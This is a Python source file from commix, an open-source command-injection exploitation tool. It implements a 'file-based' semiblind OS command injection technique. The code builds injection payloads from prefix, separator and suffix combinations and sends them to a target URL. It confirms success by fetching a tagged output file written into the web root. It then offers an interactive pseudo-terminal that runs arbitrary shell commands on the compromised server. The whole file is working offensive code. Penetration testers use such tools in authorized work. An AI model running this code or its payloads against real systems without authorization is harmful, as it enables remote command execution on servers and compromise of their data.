#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
import time
import string
import random
import base64
import urllib
import urllib2

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.semiblind_based.techniques.file_based import fb_injector
from src.core.injections.semiblind_based.techniques.file_based import fb_payloads
from src.core.injections.semiblind_based.techniques.file_based import fb_enumeration
from src.core.injections.semiblind_based.techniques.tempfile_based import tfb_handler

"""
 The "File-based" technique on Semiblind-based OS Command Injection.
"""

# If temp-based technique failed, 
# use the "/tmp/" directory for tempfile-based technique.
def tfb_controller(no_result,url,delay,tmp_path,filename,http_request_method):
  if no_result == True:
    sys.stdout.write("(*) Trying to upload file, on temporary directory (" + tmp_path + ")...\n")
    tfb_handler.exploitation(url,delay,filename,tmp_path,http_request_method)     
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()

# Delete previous shells.
def delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE):
  cmd = "rm " + OUTPUT_TEXTFILE
  response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)

#-----------------------------------------------
# The "file-based" injection technique handler
#-----------------------------------------------
def fb_injection_handler(url,delay,filename,http_request_method):

  counter = 0
  vp_flag = True
  exit_loops = False
  no_result = True
  is_encoded= False
  stop_injection = False
  injection_type = "Semiblind-based Command Injection"
  technique = "file-based semiblind injection technique"
  
  if menu.options.tmp_path:
    tmp_path = menu.options.tmp_path
  else:
    tmp_path = settings.TMP_PATH
		  
  print "(*) Testing the "+ technique + "... "
  
  if menu.options.srv_root_dir:
    SRV_ROOT_DIR = menu.options.srv_root_dir
  else:
    SRV_ROOT_DIR = settings.SRV_ROOT_DIR

  # Print the findings to log file.
  output_file = open(filename + ".txt", "a")
  output_file.write("\n---")
  output_file.write("\n(+) Type : " + injection_type)
  output_file.write("\n(+) Technique : " + technique.title())
  output_file.close()
  
  i = 0
  # Calculate all possible combinations
  total = len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
  
  for prefix in settings.PREFIXES:
    for suffix in settings.SUFFIXES:
      for separator in settings.SEPARATORS:
	i = i + 1
	
	# Change TAG on every request to prevent false-positive resutls.
	TAG = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) 

	# Check if defined "--base64" option.
	if menu.options.base64_trick == True:
	  B64_ENC_TAG = base64.b64encode(TAG)
	  B64_DEC_TRICK = settings.B64_DEC_TRICK
	else:
	  B64_ENC_TAG = TAG
	  B64_DEC_TRICK = ""
	  
	# The output file for file-based injection technique.
	OUTPUT_TEXTFILE = B64_ENC_TAG + ".txt"
	
	# Check for bad combination of prefix and separator
	combination = prefix + separator
	if combination in settings.JUNK_COMBINATION:
	  prefix = ""

	try:
	  # File-based decision payload (check if host is vulnerable).
	  payload = fb_payloads.decision(separator,B64_ENC_TAG,B64_DEC_TRICK,OUTPUT_TEXTFILE)
		  
	  # Check if defined "--prefix" option.
	  if menu.options.prefix:
	    prefix = menu.options.prefix
	    payload = prefix + payload
	  else:
	    payload = prefix + payload
	    
	  # Check if defined "--suffix" option.
	  if menu.options.suffix:
	    suffix = menu.options.suffix
	    payload = payload + suffix
	  else:
	    payload = payload + suffix

	  #Check if defined "--verbose" option.
	  if menu.options.verbose:
	    sys.stdout.write("\n" + colors.GREY + payload + colors.RESET + "\n")
	    
	  # Check if target host is vulnerable.
	  response,vuln_parameter = fb_injector.injection_test(payload,http_request_method,url)

	  # Find the directory.
	  path = url
	  path_parts = path.split('/')
	  count = 0
	  for part in path_parts:	
	    count = count + 1
	  count = count - 1
	  last_param = path_parts[count]
	  output = url.replace(last_param,OUTPUT_TEXTFILE)
	  time.sleep(delay)
	  
	  try:
	    # Check if defined extra headers.
	    request = urllib2.Request(output)
	    headers.do_check(request)
	    
	    # Evaluate test results.
	    output = urllib2.urlopen(request)
	    html_data = output.read()
	    shell = re.findall(r"" + TAG + "", html_data)
	    if len(shell) != 0 and not menu.options.verbose:
	      percent = colors.GREEN + "SUCCEED" + colors.RESET
	      sys.stdout.write("\r(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... [ " + percent + " ]")  
	      sys.stdout.flush()
	      
	  except urllib2.HTTPError, e:
	      if e.getcode() == 404:
		percent = ((i*100)/total)
		# Show an error message, after 20 failed tries.
		# Use the "/tmp/" directory for tempfile-based technique.
		if i == 20:
		  print "\n" + colors.BGRED + "(x) Error: It seems that you don't have permissions to write on "+ SRV_ROOT_DIR + "." + colors.RESET
		  tmp_upload = raw_input("(*) Do you want to try the temporary directory (" + tmp_path + ") [Y/n] > ").lower()
		  if tmp_upload in settings.CHOISE_YES:
		    exit_loops = True
		    tfb_controller(no_result,url,delay,tmp_path,filename,http_request_method)
		  else:
		    continue
		else:
		  if exit_loops == False:
		    if not menu.options.verbose:
		      if percent == 100:
			if no_result == True:
			  percent = colors.RED + "FAILED" + colors.RESET
			else:
			  percent = str(percent)+"%"
		      else:
			percent = str(percent)+"%"
		      sys.stdout.write("\r(*) Trying to upload the '"+ OUTPUT_TEXTFILE +"' on " + SRV_ROOT_DIR + "... [ " + percent + " ]")  
		      sys.stdout.flush()
		      continue
		    else:
		      continue
		  else:
		    raise
		
	      elif e.getcode() == 401:
		print colors.BGRED + "(x) Error: Authorization required!" + colors.RESET + "\n"
		sys.exit(0)
		
	      elif e.getcode() == 403:
		print colors.BGRED + "(x) Error: You don't have permission to access this page." + colors.RESET + "\n"
		sys.exit(0)
	  
	except KeyboardInterrupt:
	  delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
	  raise
	
	except urllib2.URLError, e:
	  #print "\n" + colors.BGRED + "(x) Error: " + str(e.reason) + colors.RESET
	  sys.exit(0)
	
	except:
	  continue
	  
	# Yaw, got shellz! 
	# Do some magic tricks!
	if shell:
	  found = True
	  no_result = False
	  
	  if http_request_method == "GET":
	    # Print the findings to log file
	    if vp_flag == True:
	      output_file = open(filename + ".txt", "a")
	      output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
	      output_file.write("\n---\n")
	      vp_flag = False
	      output_file.close()
	      
	    counter = counter + 1
	    output_file = open(filename + ".txt", "a")
	    output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	    output_file.close()
	    
	    #Vulnerabe Parameter
	    GET_vuln_param = parameters.vuln_GET_param(url)
	      
	    # Print the findings to terminal.
	    print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + colors.UNDERL + GET_vuln_param + colors.RESET + colors.BOLD + "' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	    print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	    print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	    print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET

	  else :
	    # Print the findings to log file
	    if vp_flag == True:
	      output_file = open(filename + ".txt", "a")
	      output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
	      output_file.write("\n---\n")
	      vp_flag = False
	      output_file.close()
	      
	    counter = counter + 1
	    output_file = open(filename + ".txt", "a")
	    output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
	    output_file.close()
	    
	    #Vulnerabe Parameter
	    POST_vuln_param = vuln_parameter
	    
	    # Print the findings to terminal.
	    print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + colors.UNDERL + POST_vuln_param + colors.RESET + colors.BOLD + "' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
	    print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
	    print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
	    print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload) + colors.RESET
	    
	  # Check for any enumeration options.
	  fb_enumeration.do_check(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE,delay)
	  try:
	    # Pseudo-Terminal shell
	    gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
	    if gotshell in settings.CHOISE_YES:
	      print ""
	      print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
	      while True:
		cmd = raw_input("Shell > ")
		if cmd == "q":
		  delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
		  sys.exit(0)
		  
		else:
		  # The main command injection exploitation.
		  response = fb_injector.injection(separator,payload,TAG,cmd,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
		  
		  # Command execution results.
		  shell = fb_injector.injection_results(url,OUTPUT_TEXTFILE,delay)
		  
		  if shell:
		    shell = " ".join(str(p) for p in shell)
		    print "\n" + colors.GREEN + colors.BOLD + shell + colors.RESET + "\n"
	    else:
	      delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
	      if menu.options.verbose:
		sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
		sys.stdout.flush()
	      pass
	    
	  except KeyboardInterrupt: 
	    delete_previous_shell(separator,payload,TAG,prefix,suffix,http_request_method,url,vuln_parameter,OUTPUT_TEXTFILE)
	    print ""
	    sys.exit(0)
	    
  if no_result == True:
    print ""
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()	
    
def exploitation(url,delay,filename,http_request_method):
    fb_injection_handler(url,delay,filename,http_request_method)

#eof